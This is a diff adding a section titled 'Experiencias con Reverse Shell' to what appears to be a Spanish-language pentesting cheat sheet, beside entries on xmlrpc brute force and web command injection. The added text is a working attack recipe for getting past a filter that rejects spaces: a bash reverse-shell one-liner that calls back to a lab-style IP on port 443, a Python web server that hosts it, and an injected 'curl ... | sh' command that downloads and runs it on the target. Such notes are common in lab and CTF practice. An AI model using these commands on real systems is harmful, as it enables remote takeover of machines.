@@ -79,6 +79,24 @@ Credenciales por fuerza bruta abusando de xmlrpc
 
 
  <a name="inyeccion_comandos"></a>
+
+### Experiencias con Reverse Shell  
+
+#### Si no deja introducir espacios en blanco, lo mejor es: 
+1º Crear un fichero .sh que contenga el código de la reverse shell  
+```
+bash -c 'bash -i >& /dev/tcp/10.10.14.54/443 0>&1'
+```
+2º Montar un servidor web para ofrecer el fichero  
+```
+python3 -m http.server 80
+```
+3º En la parte donde podamos inyectar el comando:
+```
+curl <IP>/shell.sh|sh
+o
+curl <IP>/shell.sh|bash
+```
 ### Inyección de comandos WEB  
 
 hay varias maneras de inyectar comandos, por ejemplo en burpsuite. Si identificamos un campo, lugar donde creemos que se pueda inyectar comandos, aquí se listan varias opciones para hacerlo.  
